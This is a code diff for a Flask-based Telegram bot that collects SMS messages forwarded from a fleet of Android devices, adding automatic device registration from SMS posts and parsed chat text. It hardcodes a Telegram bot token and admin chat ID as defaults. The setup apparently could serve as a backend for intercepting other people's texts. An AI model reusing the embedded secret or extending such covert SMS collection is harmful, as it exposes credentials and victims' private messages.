@@ -17,7 +17,7 @@ from telebot.types import (
 # ----------------------------------------------------
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8832238459:AAGR6_N00HtDjJv7IEdwu-y-1U2RW9VO9rk")
 ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "8753024194")
-GROUP_CHAT_ID = os.environ.get("GROUP_CHAT_ID") or os.environ.get("GROUPCHATID") or "-1004375481014"
+GROUP_CHAT_ID = os.environ.get("GROUP_CHAT_ID", "")
 RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
 
 app = Flask(__name__)
@@ -31,6 +31,44 @@ devices = {}
 # ----------------------------------------------------
 def is_admin(chat_id):
     return str(chat_id).strip() == str(ADMIN_CHAT_ID).strip()
+
+def extract_and_auto_register_device(text):
+    """
+    Auto-registers device if a message in chat contains device metadata
+    (e.g., from direct TelegramSender notifications or SMS messages).
+    """
+    if not text:
+        return
+
+    id_match = re.search(r"🆔\s*\*?ID:\*?\s*`?([a-zA-Z0-9_-]+)`?", text, re.IGNORECASE)
+    if not id_match:
+        return
+
+    dev_id = id_match.group(1).strip()
+
+    alias_match = re.search(r"📱\s*\*?Device:\*?\s*`?([^`\n]+)`?", text, re.IGNORECASE)
+    dev_alias = alias_match.group(1).strip() if alias_match else "Android Device"
+
+    model_match = re.search(r"📲\s*\*?Model:\*?\s*`?([^`\n]+)`?", text, re.IGNORECASE)
+    dev_model = model_match.group(1).strip() if model_match else dev_alias
+
+    if dev_id not in devices:
+        devices[dev_id] = {
+            "deviceId": dev_id,
+            "deviceAlias": dev_alias,
+            "model": dev_model,
+            "batteryLevel": 100,
+            "isCharging": False,
+            "isServiceRunning": True,
+            "isForwardingEnabled": True,
+            "killReason": "Auto-registered via Telegram notification",
+            "lastSeen": time.time()
+        }
+        print(f"[Auto-Registered via Telegram Message] ID: {dev_id} | Alias: {dev_alias}")
+    else:
+        devices[dev_id]["lastSeen"] = time.time()
+        devices[dev_id]["deviceAlias"] = dev_alias
+        devices[dev_id]["model"] = dev_model
 
 def build_main_reply_keyboard():
     markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
@@ -177,6 +215,20 @@ def forward_sms():
     else:
         time_str = time.strftime("%Y-%m-%d %H:%M:%S")
 
+    # Auto-register device if missing
+    if dev_id and dev_id not in devices:
+        devices[dev_id] = {
+            "deviceId": dev_id,
+            "deviceAlias": "Android Device",
+            "model": "Android Phone",
+            "batteryLevel": 100,
+            "isCharging": False,
+            "isServiceRunning": True,
+            "isForwardingEnabled": True,
+            "killReason": "Auto-registered on SMS receive",
+            "lastSeen": time.time()
+        }
+
     dev = devices.get(dev_id, {})
     device_name = dev.get("deviceAlias") or "Android Device"
 
@@ -230,6 +282,9 @@ def handle_text_messages(message):
     chat_id = str(message.chat.id)
     chat_type = message.chat.type
     text = message.text.strip()
+
+    # Extract & Auto-register device if message contains device details
+    extract_and_auto_register_device(text)
 
     # Group / Channel Discovery
     if chat_type in ['group', 'supergroup', 'channel']:
